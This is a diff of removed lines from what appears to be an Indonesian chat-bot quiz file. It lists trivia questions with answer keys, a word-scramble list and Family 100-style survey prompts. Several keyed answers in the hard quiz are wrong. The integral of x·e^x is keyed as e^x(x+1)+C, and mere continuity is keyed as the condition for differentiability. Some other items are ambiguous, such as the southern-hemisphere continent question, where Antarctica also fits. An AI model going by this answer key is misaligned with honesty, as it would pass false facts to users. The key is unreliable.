-    pilihan: ["A. Jepang", "B. Korea", "C. China", "D. Mongolia"],
-    jawaban: "C"
-  },
-  {
-    soal: "Siapa presiden pertama Indonesia?",
-    pilihan: ["A. Soeharto", "B. Jokowi", "C. BJ Habibie", "D. Soekarno"],
-    jawaban: "D"
-  },
-  {
-    soal: "Berapa warna pelangi?",
-    pilihan: ["A. 5", "B. 6", "C. 7", "D. 8"],
-    jawaban: "C"
-  },
-    {
-    soal: "Apa nama perjanjian yang mengakhiri Perang Dunia I?",
-    pilihan: ["A. Versailles", "B. Potsdam", "C. Yalta", "D. Geneva"],
-    jawaban: "A"
-  },
-  {
-    soal: "Benua yang seluruh wilayahnya berada di belahan bumi selatan adalah?",
-    pilihan: ["A. Afrika", "B. Australia", "C. Amerika Selatan", "D. Antartika"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa gas yang paling banyak di udara?",
-    pilihan: ["A. Oksigen", "B. Karbon dioksida", "C. Nitrogen", "D. Hidrogen"],
-    jawaban: "C"
-  },
-  {
-    soal: "Siapa tokoh penjelajah samudra yang menemukan jalur laut ke India?",
-    pilihan: ["A. Vasco da Gama", "B. Christopher Columbus", "C. Ferdinand Magellan", "D. Marco Polo"],
-    jawaban: "A"
-  },
-  {
-    soal: "Apa nama alat untuk mengukur waktu?",
-    pilihan: ["A. Barometer", "B. Termometer", "C. Stopwatch", "D. Altimeter"],
-    jawaban: "C"
-  },
-  {
-    soal: "Negara dengan jumlah penduduk terbanyak di dunia?",
-    pilihan: ["A. India", "B. Amerika Serikat", "C. Indonesia", "D. China"],
-    jawaban: "A"
-  },
-  {
-    soal: "Apa nama lapisan terluar Bumi?",
-    pilihan: ["A. Inti", "B. Mantel", "C. Kerak", "D. Astenosfer"],
-    jawaban: "C"
-  },
-  {
-    soal: "Siapa penemu hukum gravitasi?",
-    pilihan: ["A. Galileo Galilei", "B. Isaac Newton", "C. Albert Einstein", "D. Nikola Tesla"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa nama sungai terpanjang di dunia?",
-    pilihan: ["A. Amazon", "B. Nil", "C. Yangtze", "D. Mississippi"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa satuan arus listrik?",
-    pilihan: ["A. Volt", "B. Ohm", "C. Watt", "D. Ampere"],
-    jawaban: "D"
-  },
-  {
-    soal: "Siapa tokoh yang dijuluki Bapak Teknologi Indonesia?",
-    pilihan: ["A. Soekarno", "B. BJ Habibie", "C. Hatta", "D. Gus Dur"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa nama sistem pemerintahan Indonesia?",
-    pilihan: ["A. Parlementer", "B. Presidensial", "C. Monarki", "D. Federal"],
-    jawaban: "B"
-  },
-  {
-    soal: "Planet yang memiliki cincin paling jelas adalah?",
-    pilihan: ["A. Jupiter", "B. Uranus", "C. Saturnus", "D. Neptunus"],
-    jawaban: "C"
-  },
-  {
-    soal: "Apa nama alat untuk mengukur tekanan darah?",
-    pilihan: ["A. Barometer", "B. Tensimeter", "C. Termometer", "D. Stetoskop"],
-    jawaban: "B"
-  },
-  {
-    soal: "Apa ibu kota negara Kanada?",
-    pilihan: ["A. Toronto", "B. Vancouver", "C. Montreal", "D. Ottawa"],
-    jawaban: "D"
-  },
-  {
-    soal: "Zat apa yang dibutuhkan tumbuhan untuk fotosintesis?",
-    pilihan: ["A. Oksigen", "B. Nitrogen", "C. Karbon dioksida", "D. Hidrogen"],
-    jawaban: "C"
-  },
-  {
-    soal: "Apa nama organisasi internasional pengganti Liga Bangsa-Bangsa?",
-    pilihan: ["A. NATO", "B. ASEAN", "C. PBB", "D. IMF"],
-    jawaban: "C"
-  },
-  {
-    soal: "Berapa jumlah derajat pada satu putaran penuh?",
-    pilihan: ["A. 90°", "B. 180°", "C. 270°", "D. 360°"],
-    jawaban: "D"
-  },
-  {
-    soal: "Apa nama alat musik tradisional dari Jawa Barat?",
-    pilihan: ["A. Gamelan", "B. Angklung", "C. Sasando", "D. Tifa"],
-    jawaban: "B"
-  },
-  {
-    soal: "Siapa presiden ketiga Indonesia?",
-    pilihan: ["A. BJ Habibie", "B. Abdurrahman Wahid", "C. Megawati", "D. Soeharto"],
-    jawaban: "A"
-  }
-
-];
-
-const sesiKuis = new Map(); 
-const sesiKuisSusah = new Map();
-const ongoingHacksSistem = {};
-
-const soalKuisSusah = [
-  { soal: "Apa satuan SI untuk fluks magnetik?", pilihan: ["A. Gauss", "B. Tesla", "C. Weber", "D. Henry", "E. Farad", "F. Ohm"], jawaban: "C" },
-  { soal: "Siapa yang mengembangkan persamaan gelombang elektromagnetik?", pilihan: ["A. Newton", "B. Faraday", "C. Ampere", "D. Maxwell", "E. Tesla", "F. Hertz"], jawaban: "D" },
-  { soal: "Apa nama teknik dalam AI untuk evaluasi nilai status permainan?", pilihan: ["A. Alpha-beta pruning", "B. Minimax", "C. Monte Carlo Tree Search", "D. Decision Tree", "E. KNN", "F. Q-Learning"], jawaban: "C" },
-  { soal: "Unsur paling reaktif dalam tabel periodik adalah?", pilihan: ["A. Fluorin", "B. Klorin", "C. Litium", "D. Natrium", "E. Cesium", "F. Rubidium"], jawaban: "E" },
-  { soal: "Siapa yang menyusun 5 postulat geometri Euclidean?", pilihan: ["A. Euclid", "B. Archimedes", "C. Pythagoras", "D. Thales", "E. Euler", "F. Gauss"], jawaban: "A" },
-  { soal: "Apa teori tentang 'lubang cacing' berasal dari solusi persamaan Einstein?", pilihan: ["A. Schwarzschild", "B. Kerr", "C. Reissner-Nordström", "D. Einstein-Rosen Bridge", "E. Minkowski", "F. Penrose Diagram"], jawaban: "D" },
-  { soal: "Apa nama model partikel dalam teori standar?", pilihan: ["A. Model Proton", "B. Model Atom Bohr", "C. Model Quark", "D. Model Kuantum", "E. Model String", "F. Model Standard"], jawaban: "F" },
-  { soal: "Apa nama teori yang memperkirakan energi nol pada suhu absolut?", pilihan: ["A. Termodinamika I", "B. Termodinamika II", "C. Termodinamika III", "D. Entropi", "E. Kalorimetri", "F. Transfer Panas"], jawaban: "C" },
-  { soal: "Apa nama proses pembentukan energi di matahari?", pilihan: ["A. Fisi", "B. Reaksi kimia", "C. Fusi nuklir", "D. Ionisasi", "E. Radiasi termal", "F. Fotosintesis"], jawaban: "C" },
-  { soal: "Siapa penemu dasar-dasar kalkulus diferensial?", pilihan: ["A. Newton", "B. Leibniz", "C. Pascal", "D. Descartes", "E. Fermat", "F. Lagrange"], jawaban: "B" },
-  { soal: "Apa fungsi utama mitokondria?", pilihan: ["A. Respirasi sel", "B. Sintesis protein", "C. Transport ion", "D. Produksi enzim", "E. Detoksifikasi", "F. Pembelahan sel"], jawaban: "A" },
-  { soal: "Apa nama sistem bintang terdekat dari bumi selain Matahari?", pilihan: ["A. Sirius", "B. Vega", "C. Proxima Centauri", "D. Betelgeuse", "E. Rigel", "F. Aldebaran"], jawaban: "C" },
-  { soal: "Hewan apa yang berevolusi paling awal di darat?", pilihan: ["A. Ikan", "B. Amfibi", "C. Reptil", "D. Mamalia", "E. Burung", "F. Serangga"], jawaban: "F" },
-  { soal: "Apa nama konstanta Planck?", pilihan: ["A. 6.626×10⁻³⁴ Js", "B. 1.602×10⁻¹⁹ C", "C. 9.81 m/s²", "D. 3.0×10⁸ m/s", "E. 1.38×10⁻²³ J/K", "F. 6.022×10²³ mol⁻¹"], jawaban: "A" },
-  { soal: "Siapa ilmuwan yang merumuskan prinsip ketidakpastian?", pilihan: ["A. Schrödinger", "B. Dirac", "C. Heisenberg", "D. Einstein", "E. Bohr", "F. Feynman"], jawaban: "C" },
-  { soal: "Apa satuan untuk medan listrik dalam SI?", pilihan: ["A. V/m", "B. A/m", "C. N/C", "D. J/s", "E. F/m", "F. T"], jawaban: "C" },
-  { soal: "Benda langit terbesar dalam tata surya?", pilihan: ["A. Jupiter", "B. Matahari", "C. Saturnus", "D. Bumi", "E. Neptunus", "F. Bulan"], jawaban: "B" },
-  { soal: "Dalam biologi, proses transkripsi terjadi di mana?", pilihan: ["A. Ribosom", "B. Mitokondria", "C. Sitoplasma", "D. Nukleus", "E. Lisosom", "F. Golgi"], jawaban: "D" },
-  { soal: "Apa nama kode genetik awal untuk sintesis protein?", pilihan: ["A. AUG", "B. UGA", "C. UAG", "D. UAA", "E. ATG", "F. GCG"], jawaban: "A" },
-  { soal: "Apa nama perangkat lunak pertama untuk spreadsheet?", pilihan: ["A. Excel", "B. VisiCalc", "C. Lotus 1-2-3", "D. Numbers", "E. SuperCalc", "F. Quattro Pro"], jawaban: "B" },
-  { soal: "Apa nama algoritma penyortiran tercepat rata-rata?", pilihan: ["A. Bubble Sort", "B. Merge Sort", "C. Quick Sort", "D. Heap Sort", "E. Insertion Sort", "F. Selection Sort"], jawaban: "C" },
-  { soal: "Apa hasil dari integral tak tentu ∫ e^x dx?", pilihan: ["A. e^x + C", "B. x·e^x + C", "C. ln|x| + C", "D. 1/x + C", "E. x²/2 + C", "F. tan⁻¹(x) + C"], jawaban: "A" },
-  { soal: "Siapa penemu transistor?", pilihan: ["A. Bardeen, Brattain, Shockley", "B. Feynman", "C. Tesla", "D. Edison", "E. Marconi", "F. Fleming"], jawaban: "A" },
-  { soal: "Apa nama himpunan bilangan yang mencakup bilangan rasional dan irasional?", pilihan: ["A. Bilangan bulat", "B. Bilangan asli", "C. Bilangan real", "D. Bilangan kompleks", "E. Bilangan cacah", "F. Bilangan imajiner"], jawaban: "C" },
-  { soal: "Apa hasil limit dari lim x→0 (sin x)/x?", pilihan: ["A. 0", "B. 1", "C. ∞", "D. Tidak ada", "E. x", "F. -1"], jawaban: "B" },
-  { soal: "Teorema mana yang menyatakan bahwa fungsi kontinu pada interval tertutup mencapai nilai maksimum dan minimum?", pilihan: ["A. Teorema Rolle", "B. Teorema Nilai Rata-rata", "C. Teorema Bolzano", "D. Teorema Nilai Ekstrem", "E. Teorema L'Hopital", "F. Teorema Taylor"], jawaban: "D" },
-  { soal: "Apa turunan dari fungsi f(x) = ln(x² + 1)?", pilihan: ["A. 2x/(x² + 1)", "B. 1/(x² + 1)", "C. x² + 1", "D. 2x ln(x)", "E. x/(x² + 1)", "F. 2/(x² + 1)"], jawaban: "A" },
-  { soal: "Integral dari 1/(1 + x²) dx adalah?", pilihan: ["A. ln|x| + C", "B. tan⁻¹(x) + C", "C. e^x + C", "D. sin⁻¹(x) + C", "E. x² + C", "F. ln(1 + x²) + C"], jawaban: "B" },
-  { soal: "Jika matriks A berordo 3x3 memiliki determinan 0, maka A bersifat?", pilihan: ["A. Invertibel", "B. Tidak memiliki determinan", "C. Singular", "D. Orthogonal", "E. Diagonal", "F. Simetris"], jawaban: "C" },
-  { soal: "Apa nilai dari ∑(k=1 to n) k²?", pilihan: ["A. n(n+1)/2", "B. n(n+1)(2n+1)/6", "C. n³", "D. (n²+n)/2", "E. (n³+n)/3", "F. (n²+2n+1)/2"], jawaban: "B" },
-  { soal: "Ruang vektor berdimensi tak hingga sering digunakan dalam?", pilihan: ["A. Geometri analitik", "B. Statistika", "C. Teori bilangan", "D. Analisis fungsional", "E. Trigonometri", "F. Topologi"], jawaban: "D" },
-  { soal: "Apa solusi dari persamaan diferensial dy/dx = y?", pilihan: ["A. e^x + C", "B. ln(x) + C", "C. y = Ce^x", "D. x² + C", "E. C/x", "F. y = ln(x)"], jawaban: "C" },
-  { soal: "Fungsi mana yang bukan fungsi bijektif?", pilihan: ["A. f(x) = x³", "B. f(x) = x", "C. f(x) = sin(x)", "D. f(x) = e^x", "E. f(x) = tan⁻¹(x)", "F. f(x) = ln(x)"], jawaban: "C" },
-  { soal: "Apa nilai dari det([[1, 2], [3, 4]])?", pilihan: ["A. 2", "B. -2", "C. 10", "D. 5", "E. -5", "F. 0"], jawaban: "B" },
-  { soal: "Pernyataan 'Setiap bilangan genap > 2 adalah hasil penjumlahan dua bilangan prima' dikenal sebagai?", pilihan: ["A. Hipotesis Riemann", "B. Teorema Fermat", "C. Konjektur Goldbach", "D. Teorema Euclid", "E. Teorema Wilson", "F. Konjektur Collatz"], jawaban: "C" },
-  { soal: "Apa syarat agar fungsi f(x) terdiferensial di x = a?", pilihan: ["A. f kontinu di x = a", "B. f′(a) ada", "C. f terbatas", "D. f′(x) kontinu di sekitar a", "E. f′(a) = 0", "F. f tidak berubah di x = a"], jawaban: "A" },
-  { soal: "Apa hasil integral ∫ x e^x dx?", pilihan: ["A. e^x(x - 1) + C", "B. e^x(x + 1) + C", "C. x² e^x + C", "D. ln|x|e^x + C", "E. x e^x - ∫ e^x dx", "F. e^(x²) + C"], jawaban: "B" },
-  { soal: "Apa nama kurva yang terbentuk dari titik yang berjarak sama dari fokus dan garis directrix?", pilihan: ["A. Lingkaran", "B. Elips", "C. Parabola", "D. Hiperbola", "E. Spiral", "F. Kurva Euler"], jawaban: "C" },
-  { soal: "Berapakah nilai dari log₄(64)?", pilihan: ["A. 3", "B. 4", "C. 5", "D. 6", "E. 2.5", "F. 2"], jawaban: "A" },
-  { soal: "Apa nama metode iteratif untuk mencari akar fungsi?", pilihan: ["A. Metode Simpson", "B. Metode Runge-Kutta", "C. Metode Newton-Raphson", "D. Metode Euler", "E. Metode Trapesium", "F. Metode Lagrange"], jawaban: "C" },
-  { soal: "Jika f(x) = x³ - 3x + 1, berapa jumlah titik stasionernya?", pilihan: ["A. 0", "B. 1", "C. 2", "D. 3", "E. 4", "F. Tak Hingga"], jawaban: "C" },
-  { soal: "Apa nama operator dalam aljabar linear untuk rotasi vektor di R²?", pilihan: ["A. Matriks Identitas", "B. Matriks Simetris", "C. Matriks Rotasi", "D. Matriks Singular", "E. Matriks Diagonal", "F. Matriks Proyeksi"], jawaban: "C" },
-  { soal: "Apa nama teorema yang menyatakan bahwa tidak ada solusi umum untuk polinomial derajat 5 atau lebih?", pilihan: ["A. Teorema Abel-Ruffini", "B. Teorema Gauss", "C. Teorema Fundamental Aljabar", "D. Teorema Lagrange", "E. Teorema Galois", "F. Teorema Fermat"], jawaban: "A" },
-  { soal: "Berapakah nilai dari ∑(n=1 to ∞) 1/n²?", pilihan: ["A. π", "B. π²/6", "C. ∞", "D. 1", "E. e", "F. ln(2)"], jawaban: "B" },
-  { soal: "Jika z adalah bilangan kompleks, maka z·z̄ = ?", pilihan: ["A. 1", "B. 0", "C. |z|²", "D. -z", "E. z̄", "F. Im(z)"], jawaban: "C" },
-  { soal: "Apa nama distribusi probabilitas diskret dengan parameter n dan p?", pilihan: ["A. Normal", "B. Poisson", "C. Binomial", "D. Geometrik", "E. Eksponensial", "F. Beta"], jawaban: "C" },
-  { soal: "Apa hasil dari ∫ cos²x dx?", pilihan: ["A. (x + sin2x)/2 + C", "B. sinx + C", "C. cosx + C", "D. x/2 + C", "E. x + cos2x + C", "F. (x - sin2x)/2 + C"], jawaban: "A" },
-  { soal: "Persamaan garis singgung lingkaran x² + y² = r² di titik (a,b) adalah?", pilihan: ["A. ax + by = r²", "B. x² + y² = ab", "C. ax + by = ab", "D. x + y = r", "E. ax - by = r", "F. a² + b² = r²"], jawaban: "A" },
-  { soal: "Apa nilai dari d/dx (arctan(x))?", pilihan: ["A. 1/(1 + x²)", "B. x/(1 + x²)", "C. 1/√(1 - x²)", "D. x²", "E. e^x", "F. ln(x)"], jawaban: "A" },
-  { soal: "Jika A adalah matriks orthogonal, maka AᵀA =", pilihan: ["A. Matriks nol", "B. Matriks identitas", "C. Matriks diagonal", "D. Matriks singular", "E. Matriks rotasi", "F. Matriks transpos"], jawaban: "B" },
-  { soal: "Dalam kombinatorik, C(n, r) = ?", pilihan: ["A. n! / (r!(n−r)!)", "B. n! / r!", "C. n × r", "D. (n + r)! / n!", "E. (n−r)! / r!", "F. r! / (n−r)!"], jawaban: "A" },
-  { soal: "Apa nama rumus untuk jumlah deret aritmetika?", pilihan: ["A. n/2(a + l)", "B. a·rⁿ", "C. a + (n−1)d", "D. n(a + d)", "E. a + n·d", "F. l·n"], jawaban: "A" },
-  { soal: "Apa nama software yang pertama kali menampilkan GUI?", pilihan: ["A. Windows", "B. macOS", "C. Xerox Alto", "D. Linux", "E. Ubuntu", "F. MS-DOS"], jawaban: "C" },
-  { soal: "Apa metode untuk mengamati mikroorganisme tanpa pewarnaan?", pilihan: ["A. Mikroskop cahaya", "B. Pewarna Gram", "C. Fase kontras", "D. Elektron transmisi", "E. Fluoresen", "F. SEM"], jawaban: "C" },
-  { soal: "Apa nama operasi militer AS di Irak tahun 2003?", pilihan: ["A. Desert Storm", "B. Rolling Thunder", "C. Enduring Freedom", "D. Iraqi Freedom", "E. Anaconda", "F. Neptune Spear"], jawaban: "D" },
-  { soal: "Apa teori yang menjelaskan asal semesta paralel?", pilihan: ["A. Relativitas Umum", "B. Big Bang", "C. Multiverse", "D. String", "E. Kuantum", "F. Inflasi"], jawaban: "C" },
-  { soal: "Apa nama planet dengan rotasi paling cepat?", pilihan: ["A. Mars", "B. Bumi", "C. Jupiter", "D. Uranus", "E. Saturnus", "F. Venus"], jawaban: "C" },
-  { soal: "Nama senyawa dengan rumus H₂SO₄?", pilihan: ["A. Asam nitrat", "B. Asam klorida", "C. Asam sulfat", "D. Asam asetat", "E. Asam fosfat", "F. Asam karbonat"], jawaban: "C" },
-  { soal: "Kapan Perang Dunia I dimulai?", pilihan: ["A. 1912", "B. 1914", "C. 1916", "D. 1918", "E. 1920", "F. 1930"], jawaban: "B" },
-  { soal: "Apa nama proses perubahan padat ke gas langsung?", pilihan: ["A. Konveksi", "B. Kondensasi", "C. Sublimasi", "D. Deposisi", "E. Evaporasi", "F. Koagulasi"], jawaban: "C" },
-  { soal: "Siapa penulis karya *The Republic*?", pilihan: ["A. Aristoteles", "B. Socrates", "C. Plato", "D. Cicero", "E. Seneca", "F. Thales"], jawaban: "C" },
-  { soal: "Apa simbol kimia untuk emas?", pilihan: ["A. Au", "B. Ag", "C. Fe", "D. Cu", "E. Sn", "F. Hg"], jawaban: "A" },
-  { soal: "Siapa penemu hukum inersia?", pilihan: ["A. Galileo", "B. Newton", "C. Kepler", "D. Descartes", "E. Copernicus", "F. Hooke"], jawaban: "A" },
-  { soal: "Berapa jumlah gigi orang dewasa normal?", pilihan: ["A. 30", "B. 32", "C. 28", "D. 36", "E. 34", "F. 26"], jawaban: "B" },
-  { soal: "Siapa pelukis *Guernica*?", pilihan: ["A. Da Vinci", "B. Michelangelo", "C. Picasso", "D. Rembrandt", "E. Van Gogh", "F. Matisse"], jawaban: "C" },
-  { soal: "Apa nama sistem penyandian genetik?", pilihan: ["A. Triplet", "B. Codon", "C. Nukleotida", "D. RNA", "E. DNA", "F. Ribosom"], jawaban: "B" },
-  { soal: "Dimana letak pusat gravitasi pada benda simetris?", pilihan: ["A. Di atas", "B. Di bawah", "C. Di tengah", "D. Di sisi", "E. Di ujung", "F. Tidak ada"], jawaban: "C" },
-  { soal: "Apa alat ukur tekanan udara?", pilihan: ["A. Anemometer", "B. Barometer", "C. Termometer", "D. Altimeter", "E. Hygrometer", "F. Dinamometer"], jawaban: "B" },
-  { soal: "Apa hukum Boyle menyatakan?", pilihan: ["A. Tekanan berbanding terbalik dengan volume", "B. Volume tetap", "C. Tekanan tetap", "D. Suhu tetap", "E. Massa tetap", "F. Energi tetap"], jawaban: "A" },
-  { soal: "Apa nama kode enkripsi publik paling populer saat ini?", pilihan: ["A. AES", "B. DES", "C. RSA", "D. SHA", "E. MD5", "F. ECC"], jawaban: "C" },
-  { soal: "Berapa derajat sudut segitiga sama sisi?", pilihan: ["A. 30°", "B. 45°", "C. 60°", "D. 90°", "E. 120°", "F. 180°"], jawaban: "C" },
-  { soal: "Satuan daya listrik adalah?", pilihan: ["A. Watt", "B. Volt", "C. Ampere", "D. Joule", "E. Ohm", "F. Henry"], jawaban: "A" },
-  { soal: "Apa simbol kimia untuk timah?", pilihan: ["A. Sn", "B. Sb", "C. S", "D. Si", "E. Sr", "F. Sc"], jawaban: "A" },
-  { soal: "Apa hukum Newton kedua?", pilihan: ["A. F = ma", "B. Aksi = reaksi", "C. Inersia", "D. Gravitasi", "E. Gaya sentripetal", "F. Momentum"], jawaban: "A" }
-];
-
-
-const soalSusunKata = [
-    "komputer", "android", "internet", "bahagia", "semangat", 
-    "program", "senyuman", "mainan", "teknologi", "pelajar",
-    "sekolah", "rumah", "cerdas", "pintar", "botak", "kecerdasan",
-    "belajar", "perpustakaan", "universitas", "penghapus", "penggaris",
-    "pelangi", "matahari", "bulan", "bintang", "angkasa", "awan", "langit",
-    "merah", "biru", "kuning", "jingga", "hitam", "putih", "ungu", "coklat",
-    "kopi", "teh", "susu", "air", "eskrim", "permen", "kue", "nasi", "roti",
-    "kucing", "anjing", "kelinci", "ular", "burung", "ikan", "gajah", "singa",
-    "pasar", "hotel", "bioskop", "kantor", "bank", "toko", "warung",
-    "pagi", "siang", "malam", "subuh", "senja", "fajar", "surya",
-    "berlari", "berenang", "makan", "tidur", "mandi", "minum", "menangis",
-    "senyum", "tertawa", "menulis", "membaca", "berhitung", "menggambar",
-    "peluru", "pisang", "jeruk", "semangka", "apel", "durian", "nanas",
-    "televisi", "kamera", "laptop", "printer", "mouse", "keyboard", "monitor",
-    "jam", "meja", "kursi", "lemari", "jendela", "pintu", "atap", "dinding",
-    "jalan", "mobil", "motor", "sepeda", "kereta", "pesawat", "kapal",
-    "dompet", "tas", "buku", "pena", "penggaris", "kalkulator", "kertas",
-    "jaket", "baju", "celana", "sepatu", "sandal", "kaos", "topi",
-    "telinga", "mata", "hidung", "mulut", "tangan", "kaki", "perut", "kepala",
-    "bola", "raket", "gawang", "wasit", "gol", "tim", "lapangan", "penonton",
-    "kamera", "drama", "film", "musik", "lagu", "penyanyi", "gitar", "piano",
-    "surat", "email", "pesan", "video", "foto", "data", "dokumen"
-];
-
-const sesiSusunKata = new Map(); // key: pengirim, value: { jawaban, timeout }
-
-const soalFamily100 = [
-  {
-    pertanyaan: "Sesuatu yang sering dicari sebelum berangkat?",
-    jawaban: ["hp", "kunci", "dompet", "helm", "jaket"]
-  },
-  {
-    pertanyaan: "Alasan orang telat bangun pagi?",
-    jawaban: ["alarm mati", "tidur malam", "begadang", "kecapean", "lupa pasang alarm"]
-  },
-  {
-    pertanyaan: "Sesuatu yang bikin kuota cepat habis?",
-    jawaban: ["tiktok", "youtube", "instagram", "streaming", "game online"]
-  },
-  {
-    pertanyaan: "Hal yang sering dilakukan sebelum tidur?",
-    jawaban: ["main hp", "rebahan", "scroll sosmed", "doa", "nonton"]
-  },
-  {
-    pertanyaan: "Makanan yang enak dimakan malam hari?",
-    jawaban: ["mie instan", "nasi goreng", "ayam goreng", "martabak", "bakso"]
-  },
-  {
-    pertanyaan: "Alasan orang membuka WhatsApp?",
-    jawaban: ["chat masuk", "grup rame", "bales pesan", "gabut", "notif"]
-  },
-  {
-    pertanyaan: "Barang yang wajib dibawa saat keluar rumah?",
-    jawaban: ["hp", "dompet", "kunci", "masker", "helm"]
-  },
-  {
-    pertanyaan: "Hal yang sering bikin emosi di jalan?",
-    jawaban: ["macet", "klakson", "lampu merah", "diserobot", "jalan rusak"]
-  },
-  {
-    pertanyaan: "Aktivitas favorit saat hujan?",
-    jawaban: ["tidur", "nonton", "rebahan", "minum hangat", "denger hujan"]
-  },
-  {
-    pertanyaan: "Sesuatu yang sering dilakukan saat bosan?",
-    jawaban: ["scroll hp", "tidur", "main game", "nonton", "makan"]
-  },
-  {
-    pertanyaan: "Aplikasi yang paling sering dibuka?",
-    jawaban: ["whatsapp", "tiktok", "instagram", "youtube", "browser"]
-  },
-  {
-    pertanyaan: "Makanan yang sering jadi pilihan cepat?",
-    jawaban: ["mie instan", "nasi goreng", "ayam geprek", "gorengan", "burger"]
-  },
-  {
-    pertanyaan: "Hal yang sering lupa dibawa ke sekolah?",
-    jawaban: ["pulpen", "buku", "tugas", "uang", "id card"]
-  },
-  {
-    pertanyaan: "Alasan orang betah di rumah?",
-    jawaban: ["nyaman", "malas keluar", "ada wifi", "capek", "hemat"]
-  },
-  {
-    pertanyaan: "Sesuatu yang sering ada di notifikasi HP?",
-    jawaban: ["chat", "grup", "promo", "update", "mention"]
-  },
-  {
-    pertanyaan: "Hal yang bikin susah fokus belajar?",
-    jawaban: ["hp", "ngantuk", "berisik", "lapar", "bosan"]
-  },
-  {
-    pertanyaan: "Minuman favorit saat panas?",
-    jawaban: ["es teh", "es kopi", "air dingin", "jus", "es jeruk"]
-  },
-  {
-    pertanyaan: "Sesuatu yang sering dilakukan saat menunggu?",
-    jawaban: ["main hp", "scroll sosmed", "diam", "ngobrol", "denger musik"]
-  },
-  {
-    pertanyaan: "Alasan orang main game?",
-    jawaban: ["hiburan", "gabut", "ngilangin stress", "temen", "hadiah"]
-  },
-  {
-    pertanyaan: "Hal yang bikin orang malas keluar rumah?",
-    jawaban: ["hujan", "capek", "macet", "mager", "panas"]
-  },
-
-    {
-    pertanyaan: "Hal pertama yang dicek setelah bangun tidur?",
-    jawaban: ["hp", "jam", "notifikasi", "waktu", "alarm"]
-  },
-  {
-    pertanyaan: "Alasan orang sering pegang HP?",
-    jawaban: ["chat", "bosan", "notif", "scroll", "gabut"]
-  },
-  {
-    pertanyaan: "Hal yang sering dilakukan di grup WhatsApp?",
-    jawaban: ["chat", "baca doang", "kirim stiker", "nge-spam", "silent"]
-  },
-  {
-    pertanyaan: "Hal yang bikin HP cepat panas?",
-    jawaban: ["main game", "ngecas", "streaming", "lama dipakai", "data nyala"]
-  },
-  {
-    pertanyaan: "Hal yang sering dicari di Google?",
-    jawaban: ["jawaban", "arti kata", "cara", "lirik lagu", "harga"]
-  },
-  {
-    pertanyaan: "Kegiatan yang sering dilakukan saat sendirian?",
-    jawaban: ["main hp", "tidur", "nonton", "denger musik", "rebahan"]
-  },
-  {
-    pertanyaan: "Hal yang sering bikin ketawa di grup?",
-    jawaban: ["stiker", "chat typo", "video lucu", "meme", "voice note"]
-  },
-  {
-    pertanyaan: "Hal yang sering dilakukan saat nunggu balasan?",
-    jawaban: ["scroll", "buka chat lain", "refresh", "nunggu", "diemin hp"]
-  },
-  {
-    pertanyaan: "Alasan orang malas balas chat?",
-    jawaban: ["sibuk", "males", "lupa", "ketiduran", "nggak mood"]
-  },
-  {
-    pertanyaan: "Hal yang sering bikin chat jadi panjang?",
-    jawaban: ["debat", "gosip", "salah paham", "bahasan random", "curhat"]
-  },
-  {
-    pertanyaan: "Sesuatu yang sering bikin HP penuh?",
-    jawaban: ["foto", "video", "aplikasi", "cache", "file whatsapp"]
-  },
-  {
-    pertanyaan: "Hal yang sering dilakukan sebelum keluar rumah?",
-    jawaban: ["cek hp", "pakai sepatu", "ambil kunci", "lihat cermin", "beresin barang"]
-  },
-  {
-    pertanyaan: "Hal yang bikin orang betah main HP lama?",
-    jawaban: ["tiktok", "youtube", "chat", "game", "scroll"]
-  },
-  {
-    pertanyaan: "Hal yang sering dilakukan saat lagi ngantuk?",
-    jawaban: ["rebahan", "minum", "scroll hp", "tutup mata", "tidur"]
-  },
-  {
-    pertanyaan: "Alasan orang buka grup lama?",
-    jawaban: ["notif", "penasaran", "tag", "rame", "nyari info"]
-  },
-  {
-    pertanyaan: "Hal yang sering bikin salah paham di chat?",
-    jawaban: ["teks doang", "emoji", "nada", "typo", "salah baca"]
-  },
-  {
-    pertanyaan: "Sesuatu yang sering dilakukan saat hujan deras?",
-    jawaban: ["nunggu reda", "tidur", "nonton", "rebahan", "ngopi"]
-  },
-  {
-    pertanyaan: "Hal yang sering dilakukan kalau kuota mau habis?",
-    jawaban: ["matin data", "beli kuota", "cari wifi", "hemat", "ngedumel"]
-  },
-  {
-    pertanyaan: "Hal yang sering bikin orang telat?",
-    jawaban: ["macet", "bangun kesiangan", "nunggu", "lupa waktu", "mager"]
-  },
-  {
-    pertanyaan: "Hal yang sering dilakukan saat lagi gabut?",
-    jawaban: ["scroll hp", "tidur", "nonton", "chat", "main game"]
-  },
-
-  {
-  pertanyaan: "Kalau lagi lapar, biasanya nyari apa?",
-  jawaban: ["makan", "nasi", "mie", "snack", "warung"]
-},
-{
-  pertanyaan: "Kalau bangun tidur, hal pertama yang sering dilakukan?",
-  jawaban: ["minum", "ke kamar mandi", "ngelamun", "mandi", "sarapan"]
-},
-{
-  pertanyaan: "Hewan yang sering bikin orang kaget di rumah?",
-  jawaban: ["cicak", "kecoa", "tikus", "nyamuk", "tokek"]
-},
-{
-  pertanyaan: "Kalau hujan deras, orang biasanya ngapain?",
-  jawaban: ["neduh", "tidur", "nonton", "minum hangat", "masuk rumah"]
-},
-{
-  pertanyaan: "Benda yang sering dicari tapi suka ilang?",
-  jawaban: ["kunci", "remote", "hp", "dompet", "sendal"]
-},
-{
-  pertanyaan: "Kalau malam hari, suara apa yang sering terdengar?",
-  jawaban: ["jangkrik", "motor", "anjing", "tv", "orang ngobrol"]
-},
-{
-  pertanyaan: "Kalau lagi capek, biasanya pengen apa?",
-  jawaban: ["tidur", "rebahan", "minum", "makan", "istirahat"]
-},
-{
-  pertanyaan: "Hewan yang sering lewat di atap rumah?",
-  jawaban: ["kucing", "tikus", "cicak", "musang", "burung"]
-},
-{
-  pertanyaan: "Kalau ke dapur, biasanya nyari apa?",
-  jawaban: ["air", "makan", "snack", "nasi", "gelas"]
-},
-{
-  pertanyaan: "Kalau bosan di rumah, biasanya ngapain?",
-  jawaban: ["tidur", "keluar", "nonton", "makan", "nongkrong"]
-},
-{
-  pertanyaan: "Hal yang sering bikin orang telat berangkat?",
-  jawaban: ["bangun kesiangan", "macet", "mandi lama", "lupa", "males"]
-},
-{
-  pertanyaan: "Kalau listrik mati, yang langsung dicari?",
-  jawaban: ["lilin", "senter", "korek", "lampu", "hp"]
-},
-{
-  pertanyaan: "Kalau malam-malam lapar, biasanya makan apa?",
-  jawaban: ["mie", "nasi", "snack", "roti", "gorengan"]
-},
-{
